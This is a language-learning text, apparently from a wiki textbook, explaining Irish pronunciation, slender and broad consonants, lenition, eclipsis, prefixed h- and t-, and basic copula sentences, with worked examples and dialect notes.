This kind of adverbs are historically speaking compound words or word groups, which accounts for their unusual stress. The locative adverbs beginning with ''la-'' include the word ''leath'', which means &quot;half&quot; or &quot;direction (towards)&quot;. They are most usual in southern dialects; northern dialects prefer ''taobh'' &quot;side&quot;, with the relevant local adverb added

== Vowels - Na Gutaí==
Standard Irish has the following vowels:

:[a] (short or long)
:[e] (short or long)
:[o] (short or long)
:[u] (short or long)
:[i] (short or long)
:[ə] (murmured vowel, auxiliary vowel, in Irish ''guta cúnta'' or the &quot;helping&quot; vowel)

and the diphthongs

:[uə]
:[iə]
:[au]
:[ai]

The last two diphthongs can in certain words acquire a nasal twang - basically, if there is a nasal consonant in the writing: ''amhras'' &quot;doubt&quot; [aurəs] or [ãurəs], but ''gabha'' &quot;smith&quot; will be pronounced as [gau], because there is no ''m''. The two diphthongs might as well be written phonetically as [ou] and [oi], or [əu] and [əi].

Basically, it should work the way that if a vowel has an acute accent, i.e. the fada, it is pronounced long, and if it hasn't, then it is pronounced short. This is also the fact in most straightforward positions, i.e. when the vowel is in the stressed syllable of a word. In unstressed syllables, short vowels - i.e. those written without a fada - become murmured auxiliary vowels, but long vowels - those written with a fada - stay long, or at the very least not murmured.

Note, though, that in dialects, a short vowel can be lengthened into a long one and a long one into a diphthong. This &quot;syllable lengthening&quot; is especially typical of Connemara dialects.

Vowels followed by -rd and by -nn are also usually lengthened: ''ard'' &quot;high&quot; is [a:rd], but it can even become [aurd] thanks to syllable lengthening. In a similar way, if an one-syllable word ends in -nn, in -rr, or in -ll, the preceding vowel is usually lengthened: ''ceann'' &quot;head, end, roof, one&quot; [k'a:N], ''mall'' &quot;slow&quot; [ma:L], ''gearr'' &quot;short&quot; [g'a:r]. It can even be diphthongized: ''ceann'' [k'aun]. Note, though, that the lengthening phenomena are very dialect-specific, and you are advised to pick them up from native speakers.

A more important thing to notice is, that in the combination ''eo'', the ''o'' is always long (with the exception of ''seo'' &quot;this&quot;, ''anseo'' &quot;here&quot;, and ''eochair'' &quot;key&quot; - ''eochair'' &quot;border, edge&quot; has a long o, as has ''eochraí'', dialectally also ''eochair'', &quot;fish-roe&quot;). This is why we don't usually write ''feirmeóir'' anymore - ''feirmeoir'' is correct.

The most difficult thing about the relationship between Irish spelling and pronunciation is, that if we have a short vowel letter followed by a lenited consonant (i.e. a consonant followed by a /h/) in a stressed syllable, this combination is pronounced either as a long vowel or as a diphthong - either [au] or [ai]. (The diphthongs [uə] and [iə] are usually written /ua/ or /uai/, and /ia/ or /iai/, respectively.) More worryingly, pronunciations are often quite different and irregular in different dialects, and to be entirely sure, you should really consult a native speaker, or at the very least the pronunciation guides in the dictionaries ''Foclóir Póca'' and ''Foclóir Scoile''.

Note, however, the following model pronunciations. These are based on ''Foclóir Scoile'' (An Gúm, Baile Átha Cliath, copyright: Rialtas na hÉireann 1994, see respective entries). However, I have added a tilde for nasalization, where it ''might'' occur, as well as other additional information. The ''Foclóir Scoile'' pronunciation is a compromise between the three major dialects, devised by three native speakers (Dónall P. Ó Baoill from Ulster, Éamonn Ó Tuathail from Connacht, and Pádraig Ó Maoileoin from Munster), and my own experience suggests that native speakers do ''not'' find this pronunciation unnatural or contrived, provided that the person using it has studied Irish literature and folklore and can speak in a fluent and natural way.

* ''togha'' [tau] &quot;choice(st)&quot;
* ''amharc'' [ãurk] &quot;sight, look&quot;. This is also used as a verb in Ulster: to look. There, though, it is usually pronounced in a worn-down way, as if written &quot;orc&quot; or &quot;onc&quot;.
* ''comhar'' [kõ:r] &quot;partnership, mutual assistance&quot;. In Connemara, it is not pronunced nasally, but the trace of nasality turns the long [o:] sound into a long [u:] sound instead, thus [ku:r]. This is what tends to happen with the o's in Connemara even in other words, when they come into contact with nasal consonants. Thus, ''dona'' &quot;bad&quot; is pronounced as [dunə], because n is a nasal consonant.
* ''radharc'' [rairk] &quot;sight&quot;
* ''aontumha'' [i:ntũ:ə] &quot;celibacy&quot;. The long u can be nasal even here. (Note that the word (and prefix) ''aon'' &quot;one&quot; is largely pronounced as [e:n] even in those dialects which usually pronounce -''ao''- as a long [i:]. Thus, in this particular instance the ''Foclóir Scoile'' pronunciation recommendation might be somewhat misleading.) 

Irish vowels are either slender (''caol'') or broad (''leathan''). This means, that they affect the quality of the adjacent consonant. A consonant that is in touch with a slender vowel (e, i, é, í) is slender, i.e. palatalized - the hard palate participates in the pronunciation, so that the consonant is softened.  A consonant that is in touch with a broad vowel is broad, i.e. non-palatalized - either velarized (the velum or soft palate participates) or labialized (lips participate). Broadness is above all about not being palatalized, so it depends on the particular occasion, whether it is more natural and easier to emphasize the broadness by velarization or by labialization. 

Often, we use ''sleamhnóga'' (singular: ''sleamhnóg'') in writing Irish, i.e. extra vowel letters adjacent to a consonant, which above all show the broad or slender nature of the consonant, but are not pronounced in any other way. In the word ''buí'' &quot;yellow&quot;, for instance, the ''-u-'' is a sleamhnóg, showing that the ''b-'' shall be pronounced broad, although it is followed by a long slender vowel ''-í''.

It is not always easy to tell a mere sleamhnóg from a vowel letter which is pronounced more fully. When the sleamhnóg comes between a long vowel and a consonant, it is obvious that it is only a sleamhnóg, but when we have two short vowel letters in one syllable, it might not be quite clear, which of them is just a sleamhnóg and which is the real thing. Especially /io/ is often problematic: words such as ''tiomáint'' &quot;driving&quot; and ''tiontú'' &quot;turning&quot; can be pronounced either way ([t'oma:n't'] or [t'ima:n't], [t'ontu:] or [t'intu:]) depending on dialect.


In such words as ''scéalaíocht'' &quot;story-telling&quot; the pronunciation suggested by the spelling is [s'k'e:li:xt], but in Ulster dialect, the real pronunciation is more like [s'k'e:lajaxt] and would suit the old spelling ''scéalaidheacht'' better.

The /ao/ of writing is basically a long [i:] preceded and followed by a broad consonant: ''saol'' &quot;life, world&quot; [si:l]. However, the two broad consonants tend to strongly influence the vowel between them, and it can sound like a Russian ''ы''. When names including this sound were borrowed into English, the /ao/ was in many instances interpreted in very different ways: thus, the name ''Ó Maolagáin'' could become ''Mulligan'' or ''Milligan''.

A long [e:] sound both followed and preceded by a broad consonant is written /ae/. Thus, the consonant N in the word ''traenach'' &quot;of a train, a train's&quot; (genitive form of ''traein'', &quot;a train&quot;) is broad, although it touches an e: [tre:nax]. Thus, we need a sleamhnóg after the -e- in the nominative form to signal that the -n is slender there: ''traein'' [tre:n'].

==Consonants - Na Consain==

To start with, let's look at the non-lenited consonants in Irish, thus, the way how consonant letters are pronounced when they are not followed by the letter h. In order to pronounce such a consonant correctly, you must pay attention to the vowel letters around it. If it is surrounded by broad vowels (a, o, u, á, ó, ú), then you must pronounce it broad, and if it is surrounded by slender vowels (e, i, é, í), then you must pronounce it slender. 

'''Broad''' (Irish: ''leathan'') means velarized or labialized. Velum is the soft palate, and when a consonant is velarized, the velum or the soft palate takes part in the way it is pronounced. Labia are the lips, and when a consonant is labialized, the lips take part in how it is pronounced. Broad consonants are velarized or labialized according to how it feels natural. Thus, the [k] sound in the word ''carr'' (which, of course, means &quot;car&quot;) is velarized, because that is the natural way to broaden the [k] in such a word. On the other hand, the [k] sound in the word ''cuid'' (which means &quot;part, share&quot;) is labialized, becoming like the English &quot;qu&quot; (and the word sounds almost like &quot;quidge&quot;).

'''Slender''' (Irish: ''caol'') means palatalized. Palatum means specifically the ''hard palate'', and it tends to soften the consonant - give it a taste of the [j] or English &quot;y&quot; sound. The Spanish ñ, for instance, is a slender n, and the Spanish ll used to be a slender L sound, but these days it is of course the same as the Spanish y for most speakers of that language. The English ll in the word &quot;million&quot; is an excellent example of a slender L, which is appropriately enough also found in its Irish equivalent, ''milliún''.

As we already saw, mute short vowels (''sleamhnóga'') are often inserted in writing just to signal that the consonant is, say, slender although it stands next to a long broad vowel, or the other way round. So, in the word ''móin'' &quot;peat, turf&quot; the long ó is indeed pronounced as a vowel, while the -i- signals that the final -n is slender.

As explained above, the terms '''slender''' and '''broad''' refer to two categories of vowels.

* The broad vowels are a, o, and u.
* The slender vowels are i and e.

A consonant that is is flanked by broad vowels is broad. A consonant that is flanked by slender vowels is slender. Don't let the fact that every consonant has two pronunciations panic you. In most cases, the difference between the broad and slender pronunciation is subtle, and you really don't need to worry about all the subtleties at first. The most dramatic differences are: 

{| class=&quot;wikitable&quot;
! Consonant
! Pronunciation
! IPA
|- 
| broad '''d''' 
| /d/ as in &quot;door&quot; 
| d
|- 
| slender '''d''' 
| /dj/, like the &quot;dg&quot; in &quot;edge&quot; 
| d͡ʒ
|- 
| broad '''s''' 
| /s/ as in &quot;say&quot; 
| s
|- 
| slender '''s''' 
| /sh/ as in &quot;sheep&quot; 
| ʃ
|- 
| broad '''t''' 
| /t/ as in &quot;talk&quot; 
| t
|- 
| slender '''t''' 
| /tch/ as in &quot;tchah!&quot; or &quot;hatch&quot;
| t͡ʃ
|}

Aside from that, broad consonants have a slight &quot;w&quot; sound associated with them, and slender consonants have a slight &quot;y&quot; sound. This is usually not noticeable except when you change from slender to broad within a word, or vice versa. To make it clear when this occurs, we'll write the &quot;w&quot; or &quot;y&quot; in a tiny font like this: &lt;font size=&quot;-3&quot;&gt;w&lt;/font&gt;,  &lt;font size=&quot;-3&quot;&gt;y&lt;/font&gt;. But we'll only do that if it helps to clarify the pronunciation, so don't worry  about figuring out why we include it in some words and leave it out in others.

=== Putting It All Together ===

{{Example|1=
Let's work through some examples in detail. We'll start with some words you probably know, but we'll look at them with fresh eyes, and pretend we don't already know how to pronounce them.

'''bád'''
----
We can tell that the &quot;b&quot; and &quot;d&quot; are broad, because they are next to a broad vowel, &quot;a&quot;. Broad consonants are generally pronounced pretty much the way they are in English, so this word shouldn't be too difficult. The fada over the &quot;a&quot; tells us it has a long sound, ''AW'' (or ''AA'' in Ulster)
We have: 
&lt;font color=blue&gt;broad b&lt;/font&gt; + á + &lt;font color=blue&gt;broad d&lt;/font&gt;.
So '''bád''' would be pronounced ''BAWD''.

'''Bríd'''
----
This word has a consonant cluster &quot;br&quot; at the beginning, but you treat it as a unit when deciding whether they're broad or slender. In this case, &quot;br&quot; is slender, as is &quot;d&quot;. Remember that slender &quot;d&quot; has a special sound. 
We have: &lt;font color=green&gt;slender br&lt;/font&gt; + í + &lt;font color=green&gt;slender d&lt;/font&gt;.
So '''Bríd''' would be pronounced ''BREEJ''. (If you want to be precise, slender &quot;r&quot; has a sort of &quot;d&quot; quality to it, so you could write the pronunciation as ''BR&lt;font size=&quot;-3&quot;&gt;d&lt;/font&gt;EEJ''... but maybe that's too confusing.)

'''bábóg'''
----
The only vowels in this word are broad, so all the consonants are broad too. 
We have: &lt;font color=blue&gt;broad b&lt;/font&gt; + á + &lt;font color=blue&gt;broad b&lt;/font&gt; + ó + &lt;font color=blue&gt;broad g&lt;/font&gt;.
So '''bábóg''' would be pronounced ''BAH-BOHG''. (Don't worry about which syllable is accented/emphasised for now. We'll talk about that later.)

'''feadóg'''
----
In this word, we have both broad and slender vowels. The &quot;f&quot; is next to a slender vowel, so it's slender. The &quot;d&quot; and &quot;g&quot; are next to broad vowels, so they are broad. Since we'll be sliding from a slender sound into a broad sound, you'll hear a bit of that &quot;y&quot; sound mentioned above -- but don't overdo it. That &quot;y&quot; shouldn't really be audible, it's more of a hint to get your lips and mouth into the right shape. 
We have: &lt;font color=green&gt;slender f&lt;/font&gt; + ea + &lt;font color=blue&gt;broad d&lt;/font&gt; + ó + &lt;font color=blue&gt;broad g&lt;/font&gt;.
So '''feadóg''' would be pronounced ''F&lt;font size=&quot;-3&quot;&gt;y&lt;/font&gt;AA-DOHG''.

'''Caoimhín'''
----
Oh no! There are three vowels in a row; how do we handle this? For the purpose of deciding whether a consonant is broad or slender, you only look at the ''adjacent vowels''. So the &quot;C&quot; is broad, the &quot;mh&quot; is slender, and the &quot;n&quot; is slender. 
We have: &lt;font color=blue&gt;broad c&lt;/font&gt; + aoi + &lt;font color=green&gt;slender mh&lt;/font&gt; + í + &lt;font color=green&gt;slender n&lt;/font&gt;.
As indicated in the previous section, '''aoi''' is pronounced ''ee''. Now we can tell that '''Caoimhín''' is pronounced ''K&lt;font size=&quot;-3&quot;&gt;w&lt;/font&gt;EE-VEEN''. (The tiny &quot;w&quot; is there because we're going from an initial broad consonant into a medial slender consonant.) 

'''súil''' and 
'''siúil'''
----
We put these two together because they really illustrate the difference one little vowel can make. Here's a tip: '''When you see a vowel combination where one of the vowels has a fada, the vowel with the fada is how it's pronounced.''' In other words, the vowel with the fada is the &quot;real&quot; vowel, and its companions are just there to tell you how to pronounce the consonants on either side. So both these words have the same vowel sound, ''OO''. And both have a slender &quot;l&quot; on the end. But one has a broad &quot;s&quot; and the other a slender &quot;s&quot;, and that makes all the difference. 
For '''súil''' we have: &lt;font color=blue&gt;broad s&lt;/font&gt; + ú + &lt;font color=green&gt;slender l&lt;/font&gt;, and for '''siúil''' we have: &lt;font color=green&gt;slender s&lt;/font&gt; + ú + &lt;font color=green&gt;slender l&lt;/font&gt;.
The only difference in pronunciation is the quality of the initial &quot;s&quot;. So
'''súil''' is pronounced ''SOOL'', and 
'''siúil''' is pronounced ''SHOOL''.

Say the word out loud, then hover your mouse over the word to check your pronunciation.
If you want, you can try writing the pronunciation phonetically -- but don't worry if you didn't write the pronunciation exactly the way we did, as long as you had the right sound in mind. For now, don't worry about which syllable has the emphasis; we'll cover that in another section.

==Lenition - An Séimhiú==

Lenition (''séimhiú'') is a modification of pronunciation of the first letter of the word - a kind of initial mutation (''claochlú tosaigh''). Lenition means different things for different consonants, but it is always expressed by adding a -h- after the consonant:

* B -&gt; BH. The /bh/ is pronounced very much like the English W, when it is followed by a broad vowel (a, o, u). When it is followed by a slender vowel (e, i), it is more like the English V.

* C -&gt; CH. The /ch/ is pronounced as a German &quot;ach&quot; sound before a broad vowel, as a German &quot;ich&quot; sound before a slender vowel.

* D -&gt; DH. This is a little more difficult. You might think that it is like the English voiced th, but if you thought so, you were mistaken. Really, /dh/ is pronounced as a [γ] sound if it is followed by a broad vowel, but as a [j] - that is, an English /y/ - if it is followed by a slender vowel. The [γ] sound is the voiced equivalent of the German ach sound - you let your vocal chords vibrate while you try to pronounce a German ach sound. The &quot;Parisian r&quot; is also a good approximation.

* F -&gt; FH. FH means simply, that there is nothing there. Nothing. Zilch. Nada. FH is only a kind of graphic symbol for showing, that normally there used to be a F- here, but it was taken away by the lenition. 

* G -&gt; GH. GH is pronounced exactly as DH. Note, though, that G is lenited in a somewhat more regular way, while D sometimes resists regular lenition. This will be especially noted in the lessons.

* M -&gt; MH. MH is pronounced as BH, but it might give the adjacent vowel a nasalized sound. 

* P -&gt; PH. This PH is pronounced as F, sensibly enough. Note though that the Irish F tends to be bilabial.

* S -&gt; SH. The Irish SH is pronounced as the English H. The S can only be lenited if it is immediately followed by a vowel or by one of the consonants N, L, R. Such words as ''strainséir'' (which, of course, means &quot;stranger&quot; or &quot;foreigner&quot;, and is either a very old English loanword or has been borrowed from Norman French into Irish and English at the same time) cannot be lenited even when in a position where it would be grammatically required.

Note that instead of being lenited, a &quot;lenitable&quot; S can turn into a T sound, which is then written ts or tS (when the S is written in upper case). This exception will be mentioned in the lessons.

In Kerry Irish, SM- might be lenited, too. This is however seldom shown in writing, as it is a local dialectal trait. In fact, it is so local that a person who isn't familiar with the dialect (or is only familiar with it from more or less standardized texts, such as Peig Sayers's notorious autobiography) will perceive it as a learner's error.

* T -&gt; TH. The Irish TH is pronounced as the Irish SH, i.e. as a H sound. And it can only be lenited when it is followed by a vowel or one of the consonants N, L, R. It also resists lenition according to the same rules as the D does.

===Lenited Consonants inside the word - Na Consain Shéimhithe laistigh den Fhocal===

When you see lenited consonants inside a word, note that they usually interact with the previous vowel, so that long vowels or diphthongs arise:

* the -amh- in ''samhradh'' &quot;summer&quot; is pronounced as [au]

* the aimh- in ''aimhréidh'' &quot;entanglement&quot; is pronounced as [aiv-]

* the -omha- in ''comhar'' &quot;cooperation&quot; is pronounced as [o:], i.e. a long o; in Connemara though, it is pronounced as [u:], because out there the touch of nasal consonants (or of what used to be a nasal consonant) usually changes an [o] sound into an [u] sound. (Similarly, in Connemara ''cnoc'' &quot;hill&quot; is pronounced as [kruk], and ''dona'' &quot;bad&quot; as [dunə].)

* the -ogha in ''togha'' &quot;pick, choice, excellent thing&quot; is pronounced as [au]

* the -abhadh in ''rabhadh'' &quot;warning&quot; is pronounced as [au]

Final, unaccented -dh or -gh can often be left unpronounced, especially in Connemara. Note, though, that a final -idh/-igh is a short, but clear [i] sound in Ulster, and an audible [ig'] in Munster; and final -adh is a short, but clear [u] sound in Ulster.

===RABHADH - WARNING===

Vowels CANNOT BE LENITED. Among learners, many seem to think that the h- that is sometimes added to the first vowel of the word, equals to lenition. THIS IS WRONG. It would be more appropriate to say, that this h- is added to the vowel in positions where a consonant would NEITHER be lenited NOR eclipsed.

==Eclipsis - An tUrú==

Eclipsis is called in Irish ''urú'', an older form is ''urdhubhadh'', from the intensifying prefix ''ur-'' &quot;very&quot; and ''dubhadh'' &quot;blackening&quot;. So, it is really eclipse, as in solar eclipse (''urú na gréine'') or in lunar eclipse (''urú na gealaí''). As with lenition, eclipsis is triggered by the preceding word - the &quot;eclipsing&quot; word so to speak, which kind of &quot;casts its shadow&quot; over the word. 

Eclipsis means, basically, that unvoiced stops become voiced, and voiced stops become nasal. Thus, c, p, and t become g, b, and d respectively, and b, d, and g become m, n, and ng respectively. Although f is a fricative sound, it is eclipsed too - it becomes voiced, i.e. either a w or a v sound - in Irish, these are perceived as variants of one sound that is written as bh, as we saw.

The disquieting thing is, that the ''actual'' pronunciation is written ''in addition'' to the original pronunciation of the first consonant letter. Thus, we see words beginning with gc-, bp-, dt-, mb-, nd-, and even bhf-, and people start panicking about, how such a monster should be pronounced. In reality, it is much more easy than it looks like:


* mb- is pronounced like m-

* gc- is pronounced like g-

* nd- is pronounced like n-

* bhf- is pronounced like bh-

* ng- is pronounced like...well, ng in the English word &quot;sing&quot;; you would expect it to be written ngg-, but that's not how it works in this case

* bp- is pronounced like b-

* dt- is pronounced like d-

Note that if the word is to be written in upper case, it's the letter showing the original pronunciation that is capitalized, not the letters showing the actual pronunciation:

* ''Gaillimh'' Galway, ''i nGaillimh'' in Galway

* ''Corcaigh'' Cork, ''i gCorcaigh'' in Cork

* ''Baile Átha Cliath'' Dublin, ''i mBaile Átha Cliath'' in Dublin

* ''Prág'' Prague, ''i bPrág'' in Prague

* ''Fear Manach'' Fermanagh, ''i bhFear Manach'' in Fermanagh

* ''Tír Eoghain'' Tyrone, ''i dTír Eoghain'' in Tyrone

* ''Deilginis'' Dalkey, ''i nDeilginis'' in Dalkey

While it was said earlier that a vowel can't be lenited, it definitely can be eclipsed. In that case, a n- is added to it. It is hyphenated before a lower-case letter, but not before an upper-case one:

* ''go n-éirí an bóthar leat'' bon voyage, ''Go nÉirí an Bóthar Leat'' Bon Voyage

Note, though, that when the eclipsis is caused by the preposition ''i'', &quot;in&quot;, the recommendation is to perceive this n- as part of the preposition. Thus, we write ''in Éirinn'', not ''i nÉirinn''. In sloppily edited books, you can of course see even ''i nÉirinn'' and ''i n-Éirinn''. The different ways to write it of course don't affect the pronunciation.

==Prefixed h- - An Réamhlitir h-==

The prefixed h-, the hiatus consonant, is often grammatically required in positions where '''neither lenition nor eclipsis occurs'''. See the following example:

''mo ghluaisteán'' &quot;my automobile&quot; - ''m'aiste'' &quot;my essay&quot;

''do ghluaisteán'' &quot;your automobile&quot; - ''d'aiste'' &quot;your essay&quot;

''a ghluaisteán'' &quot;his automobile&quot; - ''a aiste'' &quot;his essay&quot;

'''''a gluaisteán''''' '''&quot;her automobile&quot;''' - '''''a haiste''''' '''&quot;her essay&quot;'''

''ár ngluaisteán'' &quot;our automobile&quot; - ''ár n-aiste'' &quot;our essay&quot;

''bhur ngluaisteán'' &quot;your automobile&quot; - ''bhur n-aiste'' &quot;your essay&quot;

''a ngluaisteán'' &quot;their automobile&quot; - ''a n-aiste'' &quot;their essay&quot;

This rule is not without its exception, however. The little word ''cá'', which is used for creating &quot;wh-&quot; questions especially in Ulster Irish, prefixes a h- to a following vowel (''cá haois é?'' &quot;what age is he&quot;, i.e. &quot;how old is he?&quot;) but lenites a following noun expressing the grade of a quality: ''cá fhad é ó tháinig sé go Conamara?'' &quot;how long is it since he came to Connemara?&quot;, i.e. &quot;how long has he been in Connemara?&quot; - Note that ''cá'' is in other dialects more often used in the sense &quot;where?&quot;, and in this sense it usually eclipses the following verb: ''cá bhfuil sé?'' &quot;where is he?&quot;

==Prefixed t- - An Réamhlitir t-==

In Irish, there are two kinds of prefixed t-:

===The t- that is prefixed to vowels===

This t- is, of course, ''added'' to the word, both in writing and pronunciation. Most typically, it comes after the singular form of the definite article in the nominative singular of masculine nouns:

*''árthach'' &quot;a vessel, a ship&quot; - ''an t-árthach'' &quot;the vessel, the ship&quot;

*''éan'' &quot;a bird&quot; - ''an t-éan'' &quot;the bird&quot;

*''iontas'' &quot;a wonder&quot; - ''an t-iontas'' &quot;the wonder&quot;

===The t- that is prefixed to words beginning with a lenitable initial s-=== 

- i.e. s + vowel, sl-, sn-, sr-. This t- is somewhat similar to the eclipsing consonant, because while it is ''added'' to the written form of the word, it ''ousts'' the initial s- in pronouncing. We see this ''instead of lenition'' after the definite article in the ''nominative singular'' of ''feminine nouns'':

* ''sráid'' &quot;a street&quot; - ''an tsráid'' [tra:d'] &quot;the street&quot;

* ''sornóg'' &quot;a stove&quot; - ''an tsornóg'' [torno:g] &quot;the stove&quot;

* ''saoirse'' &quot;liberty, freedom&quot; - ''an tsaoirse'' [ti:r's'ə] &quot;the liberty, the freedom&quot;

* ''sleamhnóg'' &quot;a glide letter (in writing Irish)&quot; - ''an tsleamhnóg'' [t'l'ãuno:g] &quot;the glide letter&quot;

* ''snaidhm'' &quot;a knot&quot; - ''an tsnaidhm'' [tnaim'] &quot;the knot&quot;

== Grammatical Changes ==

{{Wikipedia|Irish initial mutations}}
Irish is an inflected language. Words undergo pronunciation and spelling changes depending on the role they play in a sentence.
Some of the most common changes are described below.
Later in this Wikibook you will learn when to apply these changes.

=== Lenition ===

Lenition is a &quot;softening&quot; (a.k.a. &quot;aspiration&quot;) of the consonant sound at the beginning of a word or syllable. It only happens to certain sounds: b, c, d, f, g, m, p, s, t; other letters are unaffected. There are two ways lenition is shown in writing: the old style (seanchló), in which a dot is placed over the consonant, and the new/modern style, where an h is added after the consonant. Some of the many cases in which you use lenition are: 
*on feminine nominative singular nouns after the article (ex. &lt;b&gt;an fhírinne&lt;/b&gt; = the truth) 
*on masculine genitive singular nouns after the article (ex. &lt;b&gt;an chroí&lt;/b&gt; = of the heart) 
*on adjectives after a feminine nominative singular noun (ex. &lt;b&gt;fírinne gheal&lt;/b&gt; = bright truth) 
*on adjectives after a masculine genitive singular noun (ex. &lt;b&gt;an chroí dhubh&lt;/b&gt; = of the black heart)  
*on adjectives after weak plural nouns which end in a slender consonant (ex. &lt;b&gt;fir bheaga&lt;/b&gt; = small men ''but'' &lt;b&gt;croíthe beaga&lt;/b&gt; = small hearts) 
*after &lt;b&gt;mo&lt;/b&gt; or &lt;b&gt;do&lt;/b&gt; (ex. &lt;b&gt;mo shaol&lt;/b&gt; = my life) 
*after &lt;b&gt;a&lt;/b&gt; when it means &quot;his&quot; (ex. &lt;b&gt;a shaol&lt;/b&gt; = his life) 
*after the vocative particle &lt;b&gt;a&lt;/b&gt; (ex. &lt;b&gt;A Dhia!&lt;/b&gt; = God!)
*in the second part of a compound word (ex. &lt;b&gt;seanmháthair&lt;/b&gt; = grandmother, literally &quot;old mother&quot;)
 
==== “DeNTaLS-DoTS” Rule ====
One of the trickier exceptions to the normal lenition rules is the infamous &quot;dentals-dots rule&quot;: if you have a d, t, or s (the consonants in &quot;dots&quot;) which would be lenited, but the letter before it is one of d, n, t, l, or s (the consonants in &quot;dentals&quot;), you don't lenite it after all. Example: &lt;b&gt;an domhain&lt;/b&gt; = of the world 
- you'd probably think to write &lt;b&gt;an dhomhain&lt;/b&gt; since it's a masculine genitive noun after the article is normally lenited, but the dentals-dots rule overrides that. It's worth noting, however, that this rule ''does not'' apply to lenition of attributive adjectives. For example &lt;b&gt;grian the&lt;/b&gt; = hot sun.

==== Other exceptions ====
In a similar vein to the dentals-dots rule, the letters b and p are left unlenited following an m, as in &lt;b&gt;um bosca&lt;/b&gt;. This is a much more obscure exception than dentals-dots, so you won't run into it very often.

Also, the letter s is not lenited when it is directly followed by one of c, p, t, m, or f, since there's no way (in Irish) that you could pronounce something like shf or shc. There are no counterexceptions to ''this'' exception, at least. For example, you write &lt;b&gt;do stair&lt;/b&gt; = &quot;your history&quot; instead of &quot;do shtair&quot;.

=== Eclipsis ===

Eclipsis is an &quot;eclipsing&quot; (obviously) of the initial consonant sound of a word by another consonant sound. It only affects seven sounds: b, c, d, f, g, p, and t; essentially what happens is that you only pronounce the eclipsing consonant(s) - the eclipsed letter gets totally left out of the pronunciation (except for ng). However, when writing one of these things you write the eclipsing letter followed by the eclipsed letter. The rules for what happens to each go like this: 
*b is eclipsed by m to become mb
*c is eclipsed by g to become gc
*d is eclipsed by n to become nd
*f is eclipsed by bh to become bhf (two letters, but one sound) 
*g is eclipsed by n to become ng (note that this is pronounced not just as a straight n, but as the hybrid ng sound, much like an ng in English)
*p is eclipsed by b to become bp
*t is eclipsed by d to become dt
These rules have to be memorized, but it really doesn't take long once you start using them.

Eclipsis is used in many cases (though not as many as lenition, by far), among which are these:
*on plural genitive nouns after the article (ex. &lt;b&gt;na bpóg&lt;/b&gt; = of the kisses) 
*after any of the plural possessive pronouns, like &quot;our&quot;, &quot;your&quot; (pl.), &quot;their&quot; (ex. &lt;b&gt;ár ngrá&lt;/b&gt; = our love, &lt;b&gt;bhur bpósadh&lt;/b&gt; = your wedding, &lt;b&gt;a gcostas&lt;/b&gt; = their cost) 
*after some preposition+article combinations - you'll have to memorize which ones, but they can be learned with use (ex. &lt;b&gt;ar an mbord&lt;/b&gt; = on the table, &lt;b&gt;ón gcósta&lt;/b&gt; = from the coast, &lt;b&gt;as an bPoblacht&lt;/b&gt; = out of the Republic) 
*after the preposition i (ex. &lt;b&gt;i mbosca&lt;/b&gt; = in a box)
 
Note the funky capitalization in eclipsed expressions: if you're capitalizing an eclipsed word, you put the eclipsed letter in uppercase, not the eclipsing letter (ex. &lt;b&gt;as an bPoblacht&lt;/b&gt; from above, and also &lt;b&gt;na bhFear&lt;/b&gt; = of the men). However if writing in all caps, you can put the eclipsing letter in uppercase - or you can leave it in lowercase. Both variants exist (ex. &lt;b&gt;NA BHFEAR&lt;/b&gt; or &lt;b&gt;NA bhFEAR&lt;/b&gt;).

=== Palatalisation ===

Palatalisation (caolú) is a change made to the last group of vowels in a word which transforms the word from having a broad ending to a slender ending. Depalatalisation (leathnú) is the reverse change; it transforms a word from having a slender ending to a broad ending. These changes are used ''a lot'' in Irish, mostly for changing nouns between singular and plural, or for switching between the various cases (nominative, genitive, dative, vocative). Here are a few representative examples which show the kinds of vowel changes involved:

{| class=&quot;wikitable&quot;
| Caolú
| Leathnú
|-
| 
* bád → báid
* fear → fir
* éan → éin
* iasc → éisc
* fionn → finn
* síol → síl
| 
* máthair → máthar
* greim → greama
* mil → meala
* bácéir → bácéara
* cuid → coda
* feadaíl → feadaíola
|}

The usual rule for palatalisation is to add an i after the last vowel, and the usual rule for depalatalisation is to remove a trailing i. These usual cases are shown in the top row of the above table.

== Basic Sentence Structure ==


{{Wikipedia|Irish syntax}}
=== Tá and Is ===

Irish has two different ways of expressing the English verb &quot;to be&quot;.

*&lt;B&gt;Tá&lt;/B&gt; is the verb &quot;to be&quot;, used for describing people or things, &quot;I am...&quot; eg. &quot;I am tired, I am here&quot; a) where something is or b) what state it is in
*&lt;B&gt;Is&lt;/B&gt; is the copula, and is not quite a complete verb; its most common use is to say what something is, &quot;I am a...&quot; eg. &quot;I am a teacher, I am a man&quot;

The copula is a sort of pseudo-verb.  It is used for four main purposes:
* Identification, or saying that some specific thing, identified by a definite noun (usually a noun with the article) or pronoun is the same as some other specific thing
** Example: &quot;That is my cow&quot; = &quot;Is í mo bhó í sin&quot;
* Classification, or saying that some specific thing fits into some class - in other words, saying that the thing &quot;is a&quot; something, where the something is a general class rather than a specific object
** Example: &quot;That is a cow&quot; = &quot;Is bó í sin&quot;
* Emphasis, or moving certain sentence parts earlier in the clause to make them more prominent to the listener or reader. English often uses tone of voice, accented syllables to do this, but Irish primarily relies on word order
** Example: &quot;In God we trust&quot; = &quot;Is i nDia a cuirimid ár muinín&quot; (compare to &quot;We trust in God&quot; = &quot;Cuirimid ár muinín i nDia&quot;)
* Questions use a special form of the copula: &quot;An.&quot;  For example &quot;An fear é Seán?&quot;: &quot;Is Seán a man?&quot;
** There are also instances in which the copula may safely be left out: &quot;Is mise Seán&quot; can become simply &quot;Mise Seán.&quot;

&quot;Bí&quot; is the verb &quot;to be.&quot;

If you want to negate &quot;tá sé,&quot; you use '''níl''' instead of '''tá'''.
Níl sé &lt;I&gt;He is not&lt;/I&gt;

=== Some Simple Sentences ===

Approximate phonetic pronunciations are provided for the phrases below. Pronunciation varies from one dialect to another. If you learned a different way of pronouncing these words, don't worry.

====Classification sentences====
In a classification sentence, we tell what class an identified person belongs to. For example, telling the profession of someone. Here are some persons and their professions.

'''Cad é is gairm bheatha duit? Cén tslí bheatha atá agat? Cén cineál oibre atá agat?''' What is your profession?

*''Is múinteoir mé.'' I am a teacher.

*''Is scoláire thú.'' You are (thou art) a scholar, a pupil. (''Scoláire'' is obviously the same word as the English ''scholar'', but the Irish word is more often used in the sense of a school pupil, which, incidentally, can also be ''dalta''. In the Irish-speaking districts, a person who could read and write - in those days when analphabetism was still common - could also be called a ''scoláire''. Note that the word for &quot;school ide&quot; is ''scoil íde''.)

